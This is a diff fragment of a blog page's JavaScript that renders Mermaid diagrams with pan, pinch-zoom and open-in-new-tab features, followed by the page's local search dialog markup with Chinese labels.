+        svg { max-width: 100%; max-height: 100%; height: auto; width: auto; }
+      </style>
+      </head><body>${svgSource}</body></html>`
+    const blob = new Blob([htmlSource], { type: 'text/html;charset=utf-8' })
+    const url = URL.createObjectURL(blob)
+    window.open(url, '_blank', 'noopener')
+    setTimeout(() => URL.revokeObjectURL(url), 30000)
+  }
+
+  const attachMermaidViewerButton = wrap => {
+    let btn = wrap.querySelector('.mermaid-open-btn')
+    if (!btn) {
+      btn = document.createElement('button')
+      btn.type = 'button'
+      btn.className = 'mermaid-open-btn'
+      wrap.appendChild(btn)
+    }
+
+    btn.innerHTML = '<i class="fa fa-search fa-fw" aria-hidden="true"></i>'
+
+    if (!btn.__mermaidViewerBound) {
+      btn.addEventListener('click', e => {
+        e.preventDefault()
+        e.stopPropagation()
+        const svg = wrap.__mermaidOriginalSvg || wrap.querySelector('svg')
+        if (!svg) return
+        const initViewBox = wrap.__mermaidInitViewBox
+        if (typeof svg === 'string') {
+          openSvgInNewTab({ source: svg, initViewBox })
+          return
+        }
+        openSvgInNewTab({ source: svg, initViewBox })
+      })
+      btn.__mermaidViewerBound = true
+    }
+  }
+
+  // Zoom around a point (px, py) in the SVG viewport (in viewBox coordinates)
+  const zoomAtPoint = (vb, factor, px, py) => {
+    const w = vb[2] * factor
+    const h = vb[3] * factor
+    const nx = px - (px - vb[0]) * factor
+    const ny = py - (py - vb[1]) * factor
+    return [nx, ny, w, h]
+  }
+
+  const initMermaidGestures = wrap => {
+    const svg = wrap.querySelector('svg')
+    if (!svg) return
+
+    // Ensure viewBox exists so gestures always work
+    const initVb = getSvgViewBox(svg)
+    wrap.__mermaidInitViewBox = initVb
+    wrap.__mermaidCurViewBox = initVb.slice()
+    setSvgViewBox(svg, initVb)
+
+    // Avoid binding multiple times on themeChange/pjax
+    if (wrap.__mermaidGestureBound) return
+    wrap.__mermaidGestureBound = true
+
+    // Helper: map client (viewport) coordinate -> viewBox coordinate
+    const clientToViewBox = (clientX, clientY) => {
+      const rect = svg.getBoundingClientRect()
+      const vb = wrap.__mermaidCurViewBox || getSvgViewBox(svg)
+      const x = vb[0] + (clientX - rect.left) * (vb[2] / rect.width)
+      const y = vb[1] + (clientY - rect.top) * (vb[3] / rect.height)
+      return { x, y, rect, vb }
+    }
+
+    const state = {
+      pointers: new Map(),
+      startVb: null,
+      startDist: 0,
+      startCenter: null
+    }
+
+    const clampVb = vb => {
+      const init = wrap.__mermaidInitViewBox || vb
+      const minW = init[2] * 0.1
+      const maxW = init[2] * 10
+      const minH = init[3] * 0.1
+      const maxH = init[3] * 10
+      vb[2] = clamp(vb[2], minW, maxW)
+      vb[3] = clamp(vb[3], minH, maxH)
+      return vb
+    }
+
+    const setCurVb = vb => {
+      vb = clampVb(vb)
+      wrap.__mermaidCurViewBox = vb
+      setSvgViewBox(svg, vb)
+    }
+
+    const onPointerDown = e => {
+      // Allow only primary button for mouse
+      if (e.pointerType === 'mouse' && e.button !== 0) return
+      svg.setPointerCapture(e.pointerId)
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      if (state.pointers.size === 1) {
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      } else if (state.pointers.size === 2) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        state.startDist = Math.hypot(dx, dy)
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        state.startCenter = { x: (pts[0].x + pts[1].x) / 2, y: (pts[0].y + pts[1].y) / 2 }
+      }
+    }
+
+    const onPointerMove = e => {
+      if (!state.pointers.has(e.pointerId)) return
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      // Pan with 1 pointer
+      if (state.pointers.size === 1 && state.startVb) {
+        const p = [...state.pointers.values()][0]
+        const prev = { x: e.clientX - e.movementX, y: e.clientY - e.movementY }
+        // movementX/Y unreliable on touch, compute from stored last position
+        const last = wrap.__mermaidLastSinglePointer || p
+        const dxClient = p.x - last.x
+        const dyClient = p.y - last.y
+        wrap.__mermaidLastSinglePointer = p
+
+        const { rect } = clientToViewBox(p.x, p.y)
+        const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        const dx = dxClient * (vb[2] / rect.width)
+        const dy = dyClient * (vb[3] / rect.height)
+        setCurVb([vb[0] - dx, vb[1] - dy, vb[2], vb[3]])
+        return
+      }
+
+      // Pinch zoom with 2 pointers
+      if (state.pointers.size === 2 && state.startVb && state.startDist > 0) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        const dist = Math.hypot(dx, dy)
+        if (!dist) return
+        const factor = state.startDist / dist // dist bigger => zoom in (viewBox smaller)
+
+        const cx = (pts[0].x + pts[1].x) / 2
+        const cy = (pts[0].y + pts[1].y) / 2
+        const centerClient = { x: cx, y: cy }
+
+        const pxy = clientToViewBox(centerClient.x, centerClient.y)
+        const cpx = pxy.x
+        const cpy = pxy.y
+
+        const vb = zoomAtPoint(state.startVb, factor, cpx, cpy)
+        setCurVb(vb)
+      }
+    }
+
+    const onPointerUpOrCancel = e => {
+      state.pointers.delete(e.pointerId)
+      if (state.pointers.size === 0) {
+        state.startVb = null
+        state.startDist = 0
+        state.startCenter = null
+        wrap.__mermaidLastSinglePointer = null
+      } else if (state.pointers.size === 1) {
+        // reset single pointer baseline to avoid jump
+        wrap.__mermaidLastSinglePointer = [...state.pointers.values()][0]
+      }
+    }
+
+    // Wheel zoom (mouse/trackpad)
+    const onWheel = e => {
+      // ctrlKey on mac trackpad pinch; we treat both as zoom
+      e.preventDefault()
+      const delta = e.deltaY
+      const zoomFactor = delta > 0 ? 1.1 : 0.9
+      const { x, y } = clientToViewBox(e.clientX, e.clientY)
+      const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      setCurVb(zoomAtPoint(vb, zoomFactor, x, y))
+    }
+
+    const onDblClick = () => {
+      const init = wrap.__mermaidInitViewBox
+      if (!init) return
+      wrap.__mermaidCurViewBox = init.slice()
+      setSvgViewBox(svg, init)
+    }
+
+    svg.addEventListener('pointerdown', onPointerDown)
+    svg.addEventListener('pointermove', onPointerMove)
+    svg.addEventListener('pointerup', onPointerUpOrCancel)
+    svg.addEventListener('pointercancel', onPointerUpOrCancel)
+    svg.addEventListener('wheel', onWheel, { passive: false })
+    svg.addEventListener('dblclick', onDblClick)
+  }
+
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+
+      // Clear old render (themeChange/pjax will rerun)
+      const oldSvg = item.querySelector('svg')
+      if (oldSvg) oldSvg.remove()
+      item.__mermaidGestureBound = false
+
+      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
+      if (!config.theme) {
+        config.theme = theme
+      }
+      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+        if (false) initMermaidGestures(item)
+        item.__mermaidOriginalSvg = svg
+        if (false) attachMermaidViewerButton(item)
+      }
+
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.2/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="/js/github-chart.js"></script><script src="/live2d-widget/autoload.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索知识库" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
